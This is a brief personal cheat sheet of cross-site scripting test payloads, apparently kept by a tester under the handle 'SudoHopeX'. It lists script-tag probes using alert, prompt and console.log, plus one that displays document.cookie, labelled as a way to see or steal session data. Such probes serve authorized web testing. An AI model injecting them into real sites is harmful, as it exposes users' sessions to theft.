# My XSS Payloads

## Test if Payload is working
```1
<script>alert('SudoHopeX')</script>
```
```2
<script>alert(1)</script>
```
- When alert(1) is blocked
```
<script>prompt('XSS')</script>
```
- testing silently without alert boxes
```4
<script>console.log('XSS')</script>
```
- See (steal) session data.
```
<script>alert(document.cookie)</script>
```
